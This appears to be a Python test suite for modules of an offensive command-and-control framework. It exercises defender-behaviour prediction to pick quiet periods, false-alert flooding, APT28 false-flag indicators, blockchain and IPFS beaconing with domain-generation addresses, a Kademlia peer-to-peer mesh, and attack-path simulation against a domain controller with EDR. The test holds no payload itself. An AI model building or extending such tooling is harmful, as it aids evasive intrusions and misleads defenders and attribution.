"""
Test suite for ultimate stage modules:
cognitive_warfare, blockchain_c2, p2p_mesh, digital_twin_sim
"""

import sys
import os
import asyncio
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "core", "modules"))

print("=" * 70)
print("Ultimate Stage Modules - Comprehensive Test Suite")
print("=" * 70)

errors = []

# =============================================================================
# Test 1: cognitive_warfare.py
# =============================================================================
print("\n[1] Testing cognitive_warfare.py...")

try:
    from cognitive_warfare import (
        CognitiveWarfareManager,
        DefenderBehaviorPredictor,
        FalseAlertGenerator,
        CognitiveDissonanceInducer,
        DefenderActivity,
        DefenderActivityType,
        APTOrganization,
        CognitiveState,
        get_cognitive_warfare_manager,
    )

    predictor = DefenderBehaviorPredictor()

    for i in range(20):
        activity = DefenderActivity(
            activity_type=DefenderActivityType.LOG_REVIEW,
            timestamp=time.time() - (i * 3600),
            duration_seconds=1800,
            intensity=0.7,
            source="target_org",
        )
        predictor.add_activity(activity)

    patterns = predictor.analyze_patterns()
    assert patterns["total_activities"] == 20, "Activity count mismatch"

    prediction = predictor.predict_risk_periods(horizon_hours=24)
    assert prediction.confidence > 0, "Prediction confidence should be > 0"
    assert prediction.recommended_action in ["normal", "silent"], "Invalid action"

    state = predictor.get_defender_state()
    assert isinstance(state, CognitiveState), "Invalid cognitive state"

    alert_gen = FalseAlertGenerator("test_network")
    alerts = alert_gen.generate_alert_burst(count=10, duration_minutes=15)
    assert len(alerts) == 10, "Alert count mismatch"

    inducer = CognitiveDissonanceInducer()
    signature = inducer.select_mimicry_target(APTOrganization.APT28)
    assert signature.apt_organization == APTOrganization.APT28, "APT mismatch"

    indicators = inducer.generate_misattribution_indicators()
    assert "techniques_used" in indicators, "Missing techniques"

    conflicting = inducer.create_conflicting_evidence()
    assert len(conflicting) > 0, "No conflicting evidence"

    manager = get_cognitive_warfare_manager("test")
    status = manager.get_status()
    assert "active" in status, "Missing active status"

    print("  OK: cognitive_warfare.py - All tests passed")

except Exception as e:
    errors.append(f"cognitive_warfare.py: {e}")
    print(f"  FAIL: cognitive_warfare.py - {e}")

# =============================================================================
# Test 2: blockchain_c2.py
# =============================================================================
print("\n[2] Testing blockchain_c2.py...")

try:
    from blockchain_c2 import (
        BlockchainC2Manager,
        SmartContractInterface,
        DistributedStorageInterface,
        BlockchainConfig,
        StorageConfig,
        BlockchainNetwork,
        DistributedStorage,
        C2Operation,
        get_blockchain_c2_manager,
    )

    config = BlockchainConfig(
        network=BlockchainNetwork.POLYGON,
        rpc_url="https://polygon-rpc.com",
        contract_address="0x" + "a" * 40,
        beacon_id="beacon_001",
    )

    storage_config = StorageConfig(
        storage_type=DistributedStorage.IPFS,
        gateway_url="https://ipfs.io/ipfs/",
    )

    interface = SmartContractInterface(config)
    assert interface._config.network == BlockchainNetwork.POLYGON, "Network mismatch"

    storage = DistributedStorageInterface(storage_config)
    dga_addr = storage.generate_dga_address(epoch=int(time.time()))
    assert len(dga_addr) > 0, "DGA address empty"

    manager = get_blockchain_c2_manager(config, storage_config)
    status = manager.get_status()
    assert "blockchain_status" in status, "Missing blockchain status"
    assert "next_dga_address" in status, "Missing DGA address"

    print("  OK: blockchain_c2.py - All tests passed")

except Exception as e:
    errors.append(f"blockchain_c2.py: {e}")
    print(f"  FAIL: blockchain_c2.py - {e}")

# =============================================================================
# Test 3: p2p_mesh.py
# =============================================================================
print("\n[3] Testing p2p_mesh.py...")

try:
    from p2p_mesh import (
        P2PMeshManager,
        KademliaRoutingTable,
        DHTStorage,
        P2PMessageRouter,
        NodeId,
        Contact,
        MeshConfig,
        MessageType,
        NodeState,
        get_p2p_mesh_manager,
    )

    node_id = NodeId()
    assert len(node_id.id_bytes) == 20, "Node ID length mismatch"
    assert len(node_id.id_hex) == 40, "Node ID hex length mismatch"

    other_id = NodeId()
    distance = node_id.distance(other_id)
    assert distance >= 0, "Distance should be non-negative"

    routing_table = KademliaRoutingTable(node_id, k=20)

    contact = Contact(
        node_id=other_id,
        ip_address="192.168.1.100",
        port=14000,
    )
    routing_table.add_contact(contact)

    nearest = routing_table.get_nearest_nodes(other_id, 10)
    assert len(nearest) == 1, "Should find 1 nearest node"

    all_contacts = routing_table.get_all_contacts()
    assert len(all_contacts) == 1, "Should have 1 contact"

    storage = DHTStorage(replicas=3)
    assert storage.store("test_key", {"data": "value"}, ttl_seconds=3600), "Store failed"
    retrieved = storage.retrieve("test_key")
    assert retrieved == {"data": "value"}, "Retrieved value mismatch"

    assert storage.delete("test_key"), "Delete failed"
    assert storage.retrieve("test_key") is None, "Should be deleted"

    router = P2PMessageRouter(node_id, routing_table)
    message = router.create_message(MessageType.PING, {"test": "data"})
    assert message["type"] == "ping", "Message type mismatch"
    assert "request_id" in message, "Missing request_id"

    config = MeshConfig(
        listen_port=14000,
        k_bucket_size=20,
        bootstrap_nodes=["192.168.1.1:14000"],
    )

    manager = get_p2p_mesh_manager(config)
    status = manager.get_status()
    assert "status" in status, "Missing status"
    assert "routing_table" in status, "Missing routing table"

    print("  OK: p2p_mesh.py - All tests passed")

except Exception as e:
    errors.append(f"p2p_mesh.py: {e}")
    print(f"  FAIL: p2p_mesh.py - {e}")

# =============================================================================
# Test 4: digital_twin_sim.py
# =============================================================================
print("\n[4] Testing digital_twin_sim.py...")

try:
    from digital_twin_sim import (
        DigitalTwinSimulationManager,
        NetworkTopologyModel,
        AttackPathSimulator,
        ProfilePreEvaluator,
        NetworkNode,
        NetworkEdge,
        AttackStep,
        AttackPath,
        NodeType,
        SecurityControl,
        AttackPhase,
        SimulationResult,
        get_digital_twin_manager,
    )

    topology = NetworkTopologyModel()

    nodes = [
        NetworkNode(node_id="workstation_1", node_type=NodeType.WORKSTATION, ip_address="192.168.1.10"),
        NetworkNode(node_id="server_1", node_type=NodeType.SERVER, ip_address="192.168.1.20"),
        NetworkNode(node_id="dc_1", node_type=NodeType.DOMAIN_CONTROLLER, ip_address="192.168.1.2",
                    security_controls=[SecurityControl.EDR, SecurityControl.BEHAVIOR_ANALYSIS]),
    ]

    for node in nodes:
        topology.add_node(node)

    edges = [
        NetworkEdge(source_id="workstation_1", target_id="server_1", port=445),
        NetworkEdge(source_id="server_1", target_id="dc_1", port=389),
    ]

    for edge in edges:
        topology.add_edge(edge)

    assert topology.get_node_count() == 3, "Node count mismatch"

    neighbors = topology.get_neighbors("workstation_1")
    assert len(neighbors) == 1, "Should have 1 neighbor"

    controls = topology.get_security_controls("dc_1")
    assert len(controls) == 2, "Should have 2 controls"

    simulator = AttackPathSimulator(topology)
    paths = simulator.generate_attack_paths("workstation_1", "dc_1", max_paths=5)
    assert len(paths) > 0, "Should generate at least 1 path"

    for path in paths:
        result = simulator.simulate_path(path)
        assert path.overall_success >= 0, "Success should be >= 0"
        assert path.overall_detection >= 0, "Detection should be >= 0"
        assert path.risk_score >= 0, "Risk score should be >= 0"

    evaluator = ProfilePreEvaluator(topology, simulator)
    evaluator.add_variant("variant_1", {"http_method": "POST"})
    evaluator.add_variant("variant_2", {"http_method": "GET"})

    best = evaluator.get_best_variant()
    assert best is not None, "Should have best variant"

    manager = get_digital_twin_manager()
    status = manager.get_status()
    assert "topology" in status, "Missing topology"
    assert "evaluator" in status, "Missing evaluator"

    print("  OK: digital_twin_sim.py - All tests passed")

except Exception as e:
    errors.append(f"digital_twin_sim.py: {e}")
    print(f"  FAIL: digital_twin_sim.py - {e}")

# =============================================================================
# Summary
# =============================================================================
print("\n" + "=" * 70)
if errors:
    print(f"FAILED: {len(errors)} test(s) failed")
    for err in errors:
        print(f"  - {err}")
    sys.exit(1)
else:
    print("SUCCESS: All ultimate stage modules passed validation!")
    print("=" * 70)
